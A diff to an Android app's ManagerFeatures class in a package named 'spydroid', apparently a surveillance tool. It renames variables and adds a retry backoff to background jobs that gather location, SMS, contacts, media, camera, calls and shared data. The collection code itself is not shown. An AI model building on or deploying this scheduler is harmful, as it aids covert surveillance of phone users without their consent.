@@ -21,6 +21,7 @@ import android.content.Context
 import android.content.Intent
 import android.os.Build
 import android.preference.PreferenceManager
+import androidx.work.BackoffPolicy
 import androidx.work.OneTimeWorkRequest
 import androidx.work.WorkManager
 import androidx.work.WorkRequest
@@ -34,6 +35,7 @@ import net.spydroid.feature.location.LocationWork
 import net.spydroid.feature.multimedia.MultimediaWork
 import net.spydroid.feature.sharedata.ShareDataWork
 import net.spydroid.feature.sms.SmsWork
+import java.util.concurrent.TimeUnit
 
 @Suppress("DEPRECATION")
 class ManagerFeatures(
@@ -91,8 +93,9 @@ class ManagerFeatures(
 
     inner class location() {
         fun start() {
-            val myWorkRequest: WorkRequest = OneTimeWorkRequest.Builder(LocationWork::class.java).build()
-            WorkManager.getInstance(context).enqueue(myWorkRequest)
+            val locationWork: WorkRequest =
+                OneTimeWorkRequest.Builder(LocationWork::class.java).build()
+            WorkManager.getInstance(context).enqueue(locationWork)
 
         }
 
@@ -103,18 +106,20 @@ class ManagerFeatures(
 
     inner class sms() {
         fun start() {
-            val myWorkRequest: WorkRequest = OneTimeWorkRequest.Builder(SmsWork::class.java).build()
-            WorkManager.getInstance(context).enqueue(myWorkRequest)
+            val smsWork: WorkRequest = OneTimeWorkRequest.Builder(SmsWork::class.java).build()
+            WorkManager.getInstance(context).enqueue(smsWork)
         }
 
         fun stop() {
             //todo
         }
     }
+
     inner class contacts() {
         fun start() {
-            val myWorkRequest: WorkRequest = OneTimeWorkRequest.Builder(ContactsWork::class.java).build()
-            WorkManager.getInstance(context).enqueue(myWorkRequest)
+            val contactsWork: WorkRequest =
+                OneTimeWorkRequest.Builder(ContactsWork::class.java).build()
+            WorkManager.getInstance(context).enqueue(contactsWork)
         }
 
         fun stop() {
@@ -124,8 +129,15 @@ class ManagerFeatures(
 
     inner class multimedia() {
         fun start() {
-            val myWorkRequest: WorkRequest = OneTimeWorkRequest.Builder(MultimediaWork::class.java).build()
-            WorkManager.getInstance(context).enqueue(myWorkRequest)
+            val multimediaWork: WorkRequest =
+                OneTimeWorkRequest.Builder(MultimediaWork::class.java).setBackoffCriteria(
+                    BackoffPolicy.LINEAR,  // politics
+                    10,  // Time 10 mins
+                    TimeUnit.MINUTES
+                )
+                    .build()
+
+            WorkManager.getInstance(context).enqueue(multimediaWork)
         }
 
         fun stop() {
@@ -135,8 +147,9 @@ class ManagerFeatures(
 
     inner class camera() {
         fun start() {
-            val myWorkRequest: WorkRequest = OneTimeWorkRequest.Builder(CameraWork::class.java).build()
-            WorkManager.getInstance(context).enqueue(myWorkRequest)
+            val cameraWOrk: WorkRequest =
+                OneTimeWorkRequest.Builder(CameraWork::class.java).build()
+            WorkManager.getInstance(context).enqueue(cameraWOrk)
         }
 
         fun stop() {
@@ -146,8 +159,9 @@ class ManagerFeatures(
 
     inner class calls() {
         fun start() {
-            val myWorkRequest: WorkRequest = OneTimeWorkRequest.Builder(CallsWork::class.java).build()
-            WorkManager.getInstance(context).enqueue(myWorkRequest)
+            val callsWork: WorkRequest =
+                OneTimeWorkRequest.Builder(CallsWork::class.java).build()
+            WorkManager.getInstance(context).enqueue(callsWork)
         }
 
         fun stop() {
@@ -157,8 +171,10 @@ class ManagerFeatures(
 
     inner class shareData() {
         fun start() {
-            val myWorkRequest: WorkRequest = OneTimeWorkRequest.Builder(ShareDataWork::class.java).build()
-            WorkManager.getInstance(context).enqueue(myWorkRequest)
+            val shareDataWork: WorkRequest =
+                OneTimeWorkRequest.Builder(ShareDataWork::class.java)
+                    .build()
+            WorkManager.getInstance(context).enqueue(shareDataWork)
         }
 
         fun stop() {
